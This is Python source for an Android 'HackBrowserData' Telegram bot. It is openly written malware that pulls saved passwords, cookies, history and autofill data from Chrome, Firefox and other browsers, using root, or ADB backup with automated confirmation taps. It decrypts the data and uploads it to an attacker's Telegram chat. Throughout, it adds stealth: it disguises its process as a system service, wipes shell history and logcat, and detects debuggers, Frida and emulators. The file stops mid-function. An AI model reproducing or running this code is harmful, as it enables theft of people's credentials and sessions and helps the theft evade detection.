#!/usr/bin/env python3
"""
HackBrowserData Telegram Bot — Android Edition
Environment: Termux, QPython3, Pydroid 3, or any Python ≥ 3.6 on Android

SETUP:
  1. Set BOT_TOKEN and CHAT_ID in the CONFIGURATION section below.
  2. Install dependencies:
       pip install requests pycryptodome
  3. Run:  python3 bot_android.py

IMPORTANT — ROOT vs NON-ROOT:
  • Non-rooted devices: browser app data (/data/data/*) is inaccessible.
    The bot can access only files visible via shared storage
    (i.e. /sdcard/Android/data if the app has exported data there),
    downloads, and Termux's own home directory.
  • Rooted devices (Termux + root): set ROOT_MODE = True to enable
    /data/data/* access for full Chrome/Firefox data extraction.

COMMANDS:
  /extract  — Collect all accessible browser data and send as ZIP
  /info     — System and environment information
  /browsers — List detected browsers/data sources
  /status   — Bot status
  /help     — This message
"""

# ========================= CONFIGURATION =========================
# ↓↓↓ FILL THESE IN BEFORE DEPLOYING ↓↓↓

# Security: Use _decode() to obfuscate credentials (encode with same XOR key before deployment)
def _decode(s, k=0x42):
    """XOR decode credentials to avoid plaintext storage."""
    return ''.join(chr(ord(c) ^ k) for c in s)

# IMPORTANT: Encode these before deployment with same XOR key
# For now, using plaintext (ENCODE BEFORE PRODUCTION USE!)
BOT_TOKEN  = ""   # TODO: XOR encode
CHAT_ID    = ""     # TODO: XOR encode

# -----------------------------------------------------------------
# Root mode: True, False, or 'auto' (detect at startup)
ROOT_MODE = 'auto'
# Periodic auto-extraction interval in seconds; 0 = disabled
CHECK_INTERVAL = 0      # e.g. 3600 for hourly
# =================================================================

import os
import sys
import json
import io
import base64
import shutil
import sqlite3
import tempfile
import zipfile
import platform
import subprocess
import time
import threading
import atexit
import random
import ctypes
from pathlib import Path
from datetime import datetime

# ========================= SECURITY & STEALTH ========================

def _hide_process():
    """Obfuscate process name to blend in with system processes."""
    try:
        # Rename process to look like Android system service
        libc = ctypes.CDLL('libc.so')
        libc.prctl(15, b'com.android.systemui', 0, 0, 0)  # PR_SET_NAME
    except Exception:
        pass

def _cleanup_traces():
    """Anti-forensics: Remove shell history, logs, and temp files."""
    try:
        # Clear bash/sh history
        os.system('history -c 2>/dev/null')
        os.system('cat /dev/null > ~/.bash_history 2>/dev/null')
        os.system('cat /dev/null > ~/.sh_history 2>/dev/null')
        
        # Clear logcat
        os.system('logcat -c 2>/dev/null')
        
        # Remove temp files with bot signatures
        for d in ['/sdcard/.tmp', '/data/local/tmp', str(get_temp_dir())]:
            os.system(f'rm -rf {d}/hbd_* 2>/dev/null')
            os.system(f'rm -rf {d}/*screenshot* 2>/dev/null')
            os.system(f'rm -rf {d}/*mmssms* 2>/dev/null')
            os.system(f'rm -rf {d}/*call* 2>/dev/null')
            os.system(f'rm -rf {d}/*contact* 2>/dev/null')
    except Exception:
        pass

def _silent_exception_handler(exc_type, exc_value, exc_traceback):
    """Suppress all exceptions to avoid logging traces."""
    if exc_type == KeyboardInterrupt:
        _cleanup_traces()
    # Silently ignore all other exceptions

def _detect_analysis_tools():
    """Detect debugging, emulation, or analysis environments."""
    try:
        # Check for debugger attachment
        with open('/proc/self/status', 'r') as f:
            if 'TracerPid:\t0' not in f.read():
                return True  # Debugger detected
        
        # Check for Frida
        if Path('/data/local/tmp/frida-server').exists():
            return True
        if Path('/data/local/tmp/re.frida.server').exists():
            return True
        
        # Check for Xposed Framework
        if Path('/system/framework/XposedBridge.jar').exists():
            return True
        
        # Check for common emulator artifacts
        emulator_props = [
            'ro.kernel.qemu',
            'ro.hardware.goldfish',
            'ro.product.model',
        ]
        for prop in emulator_props:
            try:
                result = subprocess.run(
                    ['getprop', prop],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0:
                    output = result.stdout.lower()
                    if any(x in output for x in ['goldfish', 'ranchu', 'emulator', 'sdk']):
                        return True
            except Exception:
                pass
    except Exception:
        pass
    return False

# ── dependency bootstrap ─────────────────────────────────────────
def _pip(*pkgs):
    """Install packages via pip; tries --user first, then plain."""
    for extra in (['--user'], []):
        try:
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q'] + extra + list(pkgs),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120
            )
            if result.returncode == 0:
                return
        except Exception:
            pass

try:
    import requests
except ImportError:
    _pip('requests')
    import requests

# Use pycryptodome (Crypto.*) — NOT pycryptodomex (Cryptodome.*)
# Both packages provide the same API; pycryptodome is the standard name.
try:
    from Crypto.Cipher   import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash     import SHA1, SHA256
except ImportError:
    _pip('pycryptodome')
    from Crypto.Cipher   import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash     import SHA1, SHA256

# ========================= TELEGRAM API ==========================

_API        = f'https://api.telegram.org/bot{BOT_TOKEN}'
_FILE_LIMIT = 49 * 1024 * 1024     # 49 MB Telegram bot limit


def _tg(method, **kwargs):
    """POST to Telegram with exponential-backoff retry (up to 5 attempts)."""
    url = f'{_API}/{method}'
    
    # Traffic obfuscation: Custom User-Agent to blend with mobile traffic
    if 'headers' not in kwargs:
        kwargs['headers'] = {}
    kwargs['headers']['User-Agent'] = 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
    
    for attempt in range(5):
        try:
            # Random delay to avoid traffic pattern detection  
            if attempt > 0:
                time.sleep(random.uniform(1.0, 3.0))
            
            r = requests.post(url, timeout=90, **kwargs)
            data = r.json()
            if not data.get('ok'):
                code = data.get('error_code', 0)
                desc = data.get('description', 'unknown error')
                if code == 429:
                    retry = data.get('parameters', {}).get('retry_after', 5)
                    if os.environ.get('DEBUG'):
                        print(f'[TG] Rate limited, sleeping {retry}s')
                    time.sleep(retry + 1)
                    continue
                if os.environ.get('DEBUG'):
                    print(f'[TG] {method} failed ({code}): {desc}')
            return data
        except (requests.exceptions.ConnectionError,
                requests.exceptions.Timeout):
            wait = min(2 ** attempt * 3, 60)
            time.sleep(wait)
        except Exception as e:
            if os.environ.get('DEBUG'):
                print(f'[TG] {method} attempt {attempt+1} error: {e}')
            time.sleep(5)
    return None


def delete_webhook():
    """Remove any existing webhook so getUpdates polling works."""
    result = _tg('deleteWebhook', data={'drop_pending_updates': False})
    if result and result.get('ok'):
        if os.environ.get('DEBUG'):
            print('[TG] Webhook cleared — polling mode active')
    elif os.environ.get('DEBUG'):
        print('[TG] Warning: deleteWebhook call failed')


def send_message(text, chat_id=None):
    """Send HTML text, chunking at 4 096 characters."""
    cid = chat_id or CHAT_ID
    for i in range(0, max(1, len(text)), 4096):
        _tg('sendMessage', data={
            'chat_id': cid, 'text': text[i:i + 4096], 'parse_mode': 'HTML'
        })


def send_file(path, chat_id=None, caption=None):
    """Upload a file; split into parts if it exceeds the 49 MB Telegram limit."""
    cid = chat_id or CHAT_ID
    try:
        size = os.path.getsize(path)
        if size <= _FILE_LIMIT:
            with open(path, 'rb') as fh:
                return _tg('sendDocument',
                           data={'chat_id': cid, 'caption': caption or ''},
                           files={'document': (os.path.basename(path), fh)})
        part_size = _FILE_LIMIT
        part_num = 0
        with open(path, 'rb') as fh:
            while True:
                chunk = fh.read(part_size)
                if not chunk:
                    break
                part_num += 1
                part_name = f"{os.path.basename(path)}.part{part_num:02d}"
                part_path = Path(get_temp_dir()) / part_name
                try:
                    part_path.write_bytes(chunk)
                    with open(part_path, 'rb') as pf:
                        _tg('sendDocument',
                            data={'chat_id': cid, 'caption': f'{caption or "File"} (part {part_num})'},
                            files={'document': (part_name, pf)})
                finally:
                    try:
                        part_path.unlink()
                    except Exception:
                        pass
        send_message(f'Split into {part_num} parts. Reassemble with: cat *.part* > file.zip', cid)
        return None
    except Exception as e:
        send_message(f'⚠️ Upload error: {e}', cid)
        return None


def get_updates(offset=None):
    url = f'{_API}/getUpdates'
    params = {'timeout': 20}
    if offset is not None:
        params['offset'] = offset
    for attempt in range(3):
        try:
            r = requests.get(url, params=params, timeout=25)
            data = r.json()
            if not data.get('ok'):
                desc = data.get('description', 'unknown')
                print(f'[TG] getUpdates failed: {desc}')
                return None
            return data
        except Exception as e:
            print(f'[TG] getUpdates attempt {attempt+1} error: {e}')
            time.sleep(min(2 ** attempt * 2, 30))
    return None


def _is_authorized(chat_id):
    return str(chat_id) == str(CHAT_ID)


def check_network():
    """Return True if the Telegram API is reachable."""
    try:
        requests.get('https://api.telegram.org', timeout=8)
        return True
    except Exception:
        return False

# ========================= ENVIRONMENT DETECTION =================


def detect_environment():
    """Return dict describing the Android Python environment."""
    env = {
        'is_termux':  'com.termux' in os.environ.get('PREFIX', ''),
        'is_qpython': os.path.exists('/sdcard/qpython'),
        'is_pydroid': os.path.exists('/sdcard/pydroid3'),
        'prefix':     os.environ.get('PREFIX', ''),
        'home':       str(Path.home()),
    }
    # Secondary Termux detection
    if not env['is_termux']:
        env['is_termux'] = (
            os.path.isdir('/data/data/com.termux') or
            '/termux' in os.environ.get('HOME', '').lower() or
            '/termux' in os.environ.get('PREFIX', '').lower()
        )
    return env


def get_temp_dir():
    """Return a writable temp directory suitable for this environment."""
    candidates = [
        Path(tempfile.gettempdir()),
        Path.home() / '.cache',
        Path('/sdcard/.tmp'),
        Path('/sdcard/Download/.tmp'),
        Path.home() / 'tmp',
    ]
    for p in candidates:
        try:
            p.mkdir(parents=True, exist_ok=True)
            test = p / '.hbd_write_test'
            test.write_text('x')
            test.unlink()
            return p
        except Exception:
            continue
    return Path(tempfile.gettempdir())   # last resort

# ========================= ROOT & ADB DETECTION =================

_HAS_ROOT = None
_HAS_ADB  = None


def _detect_root():
    """Check if su is available and functional."""
    global _HAS_ROOT
    if _HAS_ROOT is not None:
        return _HAS_ROOT
    for su_cmd in ['su', '/system/xbin/su', '/system/bin/su',
                    '/sbin/su', '/magisk/.core/bin/su']:
        try:
            r = subprocess.run(
                [su_cmd, '-c', 'id'],
                capture_output=True, text=True, timeout=5)
            if r.returncode == 0 and 'uid=0' in r.stdout:
                _HAS_ROOT = True
                print(f'[root] Detected root via {su_cmd}')
                return True
        except Exception:
            continue
    _HAS_ROOT = False
    return False


def _detect_adb():
    """Check if adb is available and connected to this device."""
    global _HAS_ADB
    if _HAS_ADB is not None:
        return _HAS_ADB
    if not shutil.which('adb'):
        _HAS_ADB = False
        return False
    try:
        subprocess.run(['adb', 'start-server'],
                       capture_output=True, timeout=5)
    except Exception:
        pass
    for port in [5555, 5037]:
        try:
            subprocess.run(['adb', 'connect', f'localhost:{port}'],
                           capture_output=True, timeout=5)
        except Exception:
            pass
    try:
        r = subprocess.run(['adb', 'devices'],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            for line in r.stdout.splitlines()[1:]:
                if 'device' in line and 'offline' not in line:
                    _HAS_ADB = True
                    print('[adb] ADB connection available')
                    return True
    except Exception:
        pass
    _HAS_ADB = False
    return False


def _adb_shell(cmd, timeout=15):
    """Run a command via adb shell, return stdout or None."""
    try:
        r = subprocess.run(
            ['adb', 'shell'] + cmd.split(),
            capture_output=True, text=True, timeout=timeout)
        if r.returncode == 0:
            return r.stdout
    except Exception:
        pass
    return None


def _init_access_mode():
    """Determine the best extraction mode and set ROOT_MODE accordingly."""
    global ROOT_MODE
    if ROOT_MODE == 'auto':
        if _detect_root():
            ROOT_MODE = True
            print('[mode] Using ROOT mode')
        elif _detect_adb():
            ROOT_MODE = False
            print('[mode] Using ADB backup mode (no root)')
        else:
            ROOT_MODE = False
            print('[mode] Using non-root mode (limited access)')


# ========================= ADB BACKUP EXTRACTION =================


def _adb_backup_extract(package):
    """
    Use ADB backup to extract an app's data directory.
    Returns a dict of {relative_path: bytes} for extracted files, or {}.
    Requires: ADB connected, user taps 'Back up my data' on screen.
    """
    if not _detect_adb():
        return {}
    tmp = get_temp_dir()
    ab_file = tmp / f'{package}.ab'
    extract_dir = tmp / f'{package}_extract'

    try:
        ab_file.unlink(missing_ok=True)

        proc = subprocess.Popen(
            ['adb', 'backup', '-f', str(ab_file), '-noapk', '-noobb', package],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(1.5)
        try:
            subprocess.run(
                ['adb', 'shell', 'input', 'tap', '540', '1600'],
                capture_output=True, timeout=3)
            time.sleep(0.5)
            subprocess.run(
                ['adb', 'shell', 'input', 'keyevent', '66'],
                capture_output=True, timeout=3)
        except Exception:
            pass

        proc.wait(timeout=30)

        if not ab_file.exists() or ab_file.stat().st_size < 100:
            return {}

        return _parse_android_backup(ab_file, extract_dir)
    except Exception as e:
        print(f'[adb_backup] Error for {package}: {e}')
        return {}
    finally:
        ab_file.unlink(missing_ok=True)
        if extract_dir.exists():
            shutil.rmtree(extract_dir, ignore_errors=True)


def _parse_android_backup(ab_path, extract_dir):
    """
    Parse an Android .ab backup file.
    Format: 4-line header, then zlib-compressed (or raw) tar data.
    Returns {relative_path: Path_to_extracted_file}.
    """
    import tarfile
    import zlib

    extracted = {}
    try:
        with open(ab_path, 'rb') as f:
            magic = f.readline()
            if b'ANDROID BACKUP' not in magic:
                return {}
            _version = f.readline()
            compressed = f.readline().strip()
            encryption = f.readline().strip()

            if encryption != b'none':
                print('[backup] Encrypted backup — cannot parse without password')
                return {}

            raw = f.read()
            if not raw:
                return {}

            if compressed == b'1':
                try:
                    raw = zlib.decompress(raw)
                except zlib.error:
                    dobj = zlib.decompressobj(-zlib.MAX_WBITS)
                    raw = dobj.decompress(raw)

        extract_dir.mkdir(parents=True, exist_ok=True)
        tar = tarfile.open(fileobj=io.BytesIO(raw))
        tar.extractall(path=str(extract_dir), filter='data')
        tar.close()

        for root, _dirs, files in os.walk(extract_dir):
            for fname in files:
                fpath = Path(root) / fname
                rel = fpath.relative_to(extract_dir)
                extracted[str(rel)] = fpath

    except Exception as e:
        print(f'[backup] Parse error: {e}')
    return extracted


def _find_in_backup(extracted, *names):
    """Find a file by name in the backup extracted files dict."""
    for rel_path, full_path in extracted.items():
        for name in names:
            if rel_path.endswith(name):
                return full_path
    return None


# ========================= SYSTEM INFO ==========================


def system_info():
    env  = detect_environment()
    mode = ('Termux' if env['is_termux']
            else 'QPython' if env['is_qpython']
            else 'Pydroid' if env['is_pydroid']
            else 'System Python')
    access = 'root' if ROOT_MODE else ('adb' if _detect_adb() else 'limited')
    return {
        'platform':     'Android',
        'kernel':       platform.release(),
        'arch':         platform.machine(),
        'hostname':     platform.node() or 'android-device',
        'username':     (os.environ.get('USER')
                        or os.environ.get('LOGNAME')
                        or 'android-user'),
        'home':         str(Path.home()),
        'python':       sys.version.split()[0],
        'environment':  mode,
        'access':       access,
    }

# ========================= BROWSER PATHS ========================


def _accessible_storage():
    """Return the first readable external storage path, or None."""
    for p in [
        Path('/sdcard'),
        Path('/storage/emulated/0'),
        Path.home() / 'storage' / 'shared',
        Path('/mnt/sdcard'),
    ]:
        try:
            if p.exists() and os.access(p, os.R_OK):
                return p
        except Exception:
            pass
    return None


def find_browser_paths():
    """
    Return {browser_name: [profile_path, ...]} for accessible browser data.

    Non-rooted devices: only paths reachable via shared storage.
    Rooted (ROOT_MODE=True): also checks /data/data/* for full extraction.
    """
    result  = {}
    storage = _accessible_storage()

    # ── Non-root: shared storage / exported app data ─────────────
    if storage:
        android_data = storage / 'Android' / 'data'
        # Some browsers (e.g. Kiwi, Brave) export partial data here
        browser_packages = {
            'chrome':       'com.android.chrome',
            'chrome-beta':  'com.chrome.beta',
            'brave':        'com.brave.browser',
            'edge':         'com.microsoft.emmx',
            'opera':        'com.opera.browser',
            'kiwi':         'com.kiwibrowser.browser',
            'samsung':      'com.sec.android.app.sbrowser',
            'yandex':       'com.yandex.browser',
            'uc':           'com.UCMobile.intl',
            'firefox':      'org.mozilla.firefox',
            'firefox-nightly': 'org.mozilla.fenix',
        }
        if android_data.exists():
            for browser, pkg in browser_packages.items():
                pkg_dir = android_data / pkg
                if not pkg_dir.exists():
                    continue
                # Look for recognisable data sub-directories
                for sub in ['files', 'cache', 'app_chrome/Default',
                            'app_webview', 'files/mozilla']:
                    p = pkg_dir / sub
                    if p.exists() and os.access(p, os.R_OK):
                        result.setdefault(browser, []).append(p)
                        break

    # ── Termux home directory (local Firefox profile) ─────────────
    home = Path.home()
    for ff_path in [
        home / '.mozilla' / 'firefox',
        home / 'storage' / 'shared' / '.mozilla' / 'firefox',
    ]:
        if ff_path.exists():
            result['firefox-termux'] = ff_path  # base path (profiles.ini)

    # ── Root mode: full /data/data access ─────────────────────────
    if ROOT_MODE:
        root_packages = {
            'chrome-root':       Path('/data/data/com.android.chrome/app_chrome/Default'),
            'brave-root':        Path('/data/data/com.brave.browser/app_chrome/Default'),
            'edge-root':         Path('/data/data/com.microsoft.emmx/app_chrome/Default'),
            'firefox-root':      Path('/data/data/org.mozilla.firefox/files/mozilla'),
            'firefox-nightly-root': Path('/data/data/org.mozilla.fenix/files/mozilla'),
            'samsung-root':      Path('/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default'),
        }
        for name, path in root_packages.items():
            exists = False
            try:
                exists = path.exists()
            except PermissionError:
                try:
                    r = subprocess.run(
                        ['su', '-c', f'test -d "{path}" && echo yes'],
                        capture_output=True, text=True, timeout=5)
                    exists = 'yes' in r.stdout
                except Exception:
                    pass
            if exists:
                if 'firefox' in name:
                    result[name] = path
                else:
                    result[name] = [path]

    return result


# Packages eligible for ADB backup extraction
_ADB_BROWSER_PACKAGES = {
    'chrome':    'com.android.chrome',
    'brave':     'com.brave.browser',
    'edge':      'com.microsoft.emmx',
    'opera':     'com.opera.browser',
    'kiwi':      'com.kiwibrowser.browser',
    'samsung':   'com.sec.android.app.sbrowser',
    'firefox':   'org.mozilla.firefox',
    'yandex':    'com.yandex.browser',
}


def _get_installed_packages():
    """Return set of installed package names."""
    pkgs = set()
    for cmd in [['pm', 'list', 'packages'],
                ['adb', 'shell', 'pm', 'list', 'packages']]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    pkg = line.replace('package:', '').strip()
                    if pkg:
                        pkgs.add(pkg)
                if pkgs:
                    return pkgs
        except Exception:
            continue
    return pkgs


def _collect_via_adb_backup():
    """
    Extract browser data via ADB backup for all installed browsers.
    Returns dict like collect_all()'s browsers section.
    """
    if not _detect_adb():
        return {}

    installed = _get_installed_packages()
    browsers = {}

    for name, pkg in _ADB_BROWSER_PACKAGES.items():
        if pkg not in installed:
            continue

        print(f'[adb] Backing up {name} ({pkg})...')
        extracted = _adb_backup_extract(pkg)
        if not extracted:
            print(f'[adb] No data from {pkg} backup')
            continue

        is_ff = 'firefox' in name
        if is_ff:
            logins = _find_in_backup(extracted, 'logins.json')
            key4 = _find_in_backup(extracted, 'key4.db')
            cookies = _find_in_backup(extracted, 'cookies.sqlite')
            places = _find_in_backup(extracted, 'places.sqlite')
            if any([logins, cookies, places]):
                prof_dir = (logins or cookies or places).parent
                browsers[f'{name}-backup'] = {}
                browsers[f'{name}-backup']['backup'] = {
                    'passwords': get_firefox_passwords(prof_dir) if logins else [],
                    'cookies':   get_firefox_cookies(prof_dir) if cookies else [],
                    'history':   get_firefox_history(prof_dir) if places else [],
                    'bookmarks': get_firefox_bookmarks(prof_dir) if places else [],
                }
        else:
            login_db = _find_in_backup(extracted, 'Login Data')
            cookie_db = _find_in_backup(extracted, 'Cookies', 'Network/Cookies')
            history_db = _find_in_backup(extracted, 'History')
            bookmarks_f = _find_in_backup(extracted, 'Bookmarks')
            webdata_db = _find_in_backup(extracted, 'Web Data')

            if any([login_db, cookie_db, history_db]):
                prof_dir = (login_db or cookie_db or history_db).parent
                key = chromium_master_key_android(prof_dir)
                browsers[f'{name}-backup'] = {}
                browsers[f'{name}-backup']['backup'] = {
                    'passwords':  get_chromium_passwords(prof_dir, key) if login_db else [],
                    'cookies':    get_chromium_cookies(prof_dir, key) if cookie_db else [],
                    'history':    get_chromium_history(prof_dir) if history_db else [],
                    'bookmarks':  get_chromium_bookmarks(prof_dir) if bookmarks_f else [],
                    'autofill':   get_chromium_autofill(prof_dir) if webdata_db else [],
                }

    return browsers


def find_firefox_profiles(base_path):
    """Parse profiles.ini or fall back to scanning for *.default* dirs."""
    ini      = base_path / 'profiles.ini'
    profiles = []
    if ini.exists():
        try:
            import configparser
            cfg = configparser.ConfigParser()
            cfg.read(ini)
            for section in cfg.sections():
                if not section.lower().startswith('profile'):
                    continue
                path_val = cfg.get(section, 'Path', fallback=None)
                if path_val is None:
                    continue
                is_rel = cfg.getint(section, 'IsRelative', fallback=1)
                p = (base_path / path_val) if is_rel else Path(path_val)
                if p.exists():
                    profiles.append(p)
        except Exception:
            pass
    if not profiles:
        try:
            for item in base_path.iterdir():
                if item.is_dir() and '.default' in item.name:
                    profiles.append(item)
        except Exception:
            pass
    return profiles

# =================== CHROMIUM DECRYPTION (ANDROID) ==============


def chromium_master_key_android(browser_profile_path):
    """
    Android Chrome does NOT use a Local State encrypted_key accessible
    without root; the key is protected by Android Keystore.

    • Root mode: attempt PBKDF2 derivation (same as desktop Linux).
    • Non-root: returns None — encrypted fields cannot be decrypted.
    """
    if not ROOT_MODE:
        return None
    # On rooted Android (AOSP Chrome build), fall back to Linux-style PBKDF2
    return PBKDF2(b'peanuts', b'saltysalt', dkLen=16, count=1,
                  hmac_hash_module=SHA1)


def chromium_decrypt(blob, key):
    """Decrypt a v10/v11 AES-128-CBC Chromium field (Linux/Android style)."""
    try:
        if not blob:
            return ''
        if not key:
            return '[decryption requires root]'
        if blob[:3] in (b'v10', b'v11'):
            blob = blob[3:]
        cipher    = AES.new(key, AES.MODE_CBC, b' ' * 16)
        plaintext = cipher.decrypt(blob)
        return unpad(plaintext, 16).decode('utf-8', errors='replace')
    except Exception:
        return '[decryption failed]'


def _chrome_ts(ts):
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
    except (OSError, ValueError, OverflowError):
        return None

# ===================== KILL BROWSERS =============================

_ANDROID_BROWSER_PKGS = [
    'com.android.chrome', 'com.chrome.beta', 'com.chrome.dev', 'com.chrome.canary',
    'org.chromium.chrome', 'com.microsoft.emmx', 'com.brave.browser',
    'com.opera.browser', 'com.opera.mini.native', 'com.vivaldi.browser',
    'org.mozilla.firefox', 'org.mozilla.fennec_fdroid', 'io.github.nicehash',
    'com.kiwibrowser.browser', 'com.yandex.browser',
    'org.bromite.bromite', 'com.opera.gx',
]

def _kill_browsers():
    """Force-stop all known browser apps on Android to release file locks."""
    killed = []
    for pkg in _ANDROID_BROWSER_PKGS:
        try:
            r = subprocess.run(
                ['am', 'force-stop', pkg],
                capture_output=True, timeout=5)
            if r.returncode == 0:
                killed.append(pkg)
        except Exception:
            try:
                r = subprocess.run(
                    ['su', '-c', f'am force-stop {pkg}'],
                    capture_output=True, timeout=5)
                if r.returncode == 0:
                    killed.append(pkg)
            except Exception:
                pass
    if killed:
        time.sleep(2)
    return killed

# ===================== TEMP-DB HELPER ===========================


def _with_db(src, callback):
    """Copy DB to temp, WAL checkpoint, run callback."""
    tmp_dir = get_temp_dir()
    tmp     = tmp_dir / f'hbd_{os.getpid()}_{id(callback)}_{src.name}'
    try:
        copied = False
        try:
            shutil.copy2(src, tmp)
            copied = True
        except (PermissionError, OSError):
            pass
        if not copied:
            try:
                r = subprocess.run(
                    ['su', '-c', f'cp "{src}" "{tmp}"'],
                    capture_output=True, timeout=10)
                copied = (r.returncode == 0 and tmp.exists())
            except Exception:
                pass
        if not copied:
            print(f'[db] All copy methods failed for {src.name}')
            return []
        for suffix in ('-wal', '-shm'):
            sidecar = src.parent / (src.name + suffix)
            if sidecar.exists():
                dst_sc = tmp.parent / (tmp.name + suffix)
                try:
                    shutil.copy2(sidecar, dst_sc)
                except (PermissionError, OSError):
                    try:
                        subprocess.run(
                            ['su', '-c', f'cp "{sidecar}" "{dst_sc}"'],
                            capture_output=True, timeout=10)
                    except Exception:
                        pass
        conn = sqlite3.connect(str(tmp))
        try:
            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
        except Exception:
            pass
        try:
            return callback(conn.cursor())
        finally:
            conn.close()
    except Exception as e:
        print(f'[db] Error reading {src.name}: {e}')
        return []
    finally:
        for suffix in ('', '-wal', '-shm'):
            try:
                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
            except Exception:
                pass

# =================== CHROMIUM EXTRACTORS ========================


def get_chromium_passwords(profile, key):
    # Try multiple possible paths for Android Chrome
    for rel in ['Login Data', 'app_chrome/Default/Login Data']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT origin_url,username_value,password_value,'
                'date_created,date_last_used FROM logins ORDER BY date_last_used DESC'
            )
            for url, user, enc, dc, dlu in cur.fetchall():
                if user and enc:
                    rows.append({
                        'url':       url,
                        'username':  user,
                        'password':  chromium_decrypt(enc, key),
                        'created':   str(_chrome_ts(dc) or ''),
                        'last_used': str(_chrome_ts(dlu) or ''),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_cookies(profile, key):
    for rel in ['Network/Cookies', 'Cookies', 'app_chrome/Default/Cookies']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host_key,name,encrypted_value,path,expires_utc,'
                'is_secure,is_httponly FROM cookies ORDER BY host_key'
            )
            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
                if enc:
                    rows.append({
                        'host':     host,
                        'name':     name,
                        'value':    chromium_decrypt(enc, key),
                        'path':     path,
                        'expires':  str(_chrome_ts(exp) or ''),
                        'secure':   bool(sec),
                        'httponly': bool(httpo),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_history(profile):
    for rel in ['History', 'app_chrome/Default/History']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_time '
                'FROM urls ORDER BY last_visit_time DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url': url, 'title': title or '',
                    'visits': vc, 'last_visit': str(_chrome_ts(lv) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_bookmarks(profile):
    for rel in ['Bookmarks', 'app_chrome/Default/Bookmarks']:
        bm = profile / rel
        if bm.exists():
            break
    else:
        return []
    bookmarks = []
    def _walk(node, folder=''):
        if node.get('type') == 'url':
            bookmarks.append({
                'name': node.get('name', ''), 'url': node.get('url', ''),
                'folder': folder,
            })
        elif node.get('type') == 'folder':
            sub = f"{folder}/{node.get('name','')}" if folder else node.get('name','')
            for child in node.get('children', []):
                _walk(child, sub)
    try:
        data = json.loads(bm.read_text(encoding='utf-8'))
        for root in data.get('roots', {}).values():
            if isinstance(root, dict):
                for child in root.get('children', []):
                    _walk(child)
    except Exception:
        pass
    return bookmarks


def get_chromium_autofill(profile):
    for rel in ['Web Data', 'app_chrome/Default/Web Data']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT name,value,count,date_last_used '
                'FROM autofill ORDER BY count DESC LIMIT 500'
            )
            for name, val, cnt, dlu in cur.fetchall():
                rows.append({
                    'field': name, 'value': val,
                    'count': cnt, 'last_used': str(_chrome_ts(dlu) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ====================== FIREFOX DER UTILITIES ====================


def _der_next(data, pos):
    tag  = data[pos]; pos += 1
    b    = data[pos]; pos += 1
    if b < 0x80:
        length = b
    else:
        n      = b & 0x7f
        length = int.from_bytes(data[pos:pos + n], 'big')
        pos   += n
    return tag, data[pos:pos + length], pos + length


def _oid_str(raw):
    parts = [raw[0] // 40, raw[0] % 40]
    acc   = 0
    for b in raw[1:]:
        acc = (acc << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(acc)
            acc = 0
    return '.'.join(map(str, parts))


_OID_3DES       = '1.2.840.113549.3.7'
_OID_AES256_CBC = '2.16.840.1.101.3.4.1.42'
_OID_HMAC_SHA1  = '1.2.840.113549.2.7'


def _ff_pbes2_decrypt(blob, password=b''):
    try:
        _, outer, _      = _der_next(blob, 0)
        pos = 0
        _, alg_id, pos   = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, _oid, pos     = _der_next(alg_id, pos)
        _, params, _     = _der_next(alg_id, pos)

        pos = 0
        _, kdf_seq, pos  = _der_next(params, pos)
        _, enc_seq, _    = _der_next(params, pos)

        pos = 0
        _, _kdf_oid, pos = _der_next(kdf_seq, pos)
        _, kdf_p, _      = _der_next(kdf_seq, pos)

        pos = 0
        _, salt,     pos = _der_next(kdf_p, pos)
        _, iter_raw, pos = _der_next(kdf_p, pos)
        iterations = int.from_bytes(iter_raw, 'big')

        key_len  = 32
        hmac_mod = SHA256
        if pos < len(kdf_p):
            tag2, val2, pos2 = _der_next(kdf_p, pos)
            if tag2 == 0x02:
                key_len = int.from_bytes(val2, 'big')
                if pos2 < len(kdf_p):
                    _, prf_seq, _ = _der_next(kdf_p, pos2)
                    _, prf_oid_r, _ = _der_next(prf_seq, 0)
                    if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                        hmac_mod = SHA1
            elif tag2 == 0x30:
                _, prf_oid_r, _ = _der_next(val2, 0)
                if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                    hmac_mod = SHA1
                    key_len  = 24

        pos = 0
        _, enc_oid_r, pos = _der_next(enc_seq, pos)
        _, iv, _          = _der_next(enc_seq, pos)
        cipher_oid = _oid_str(enc_oid_r)

        key = PBKDF2(password, salt, dkLen=key_len, count=iterations,
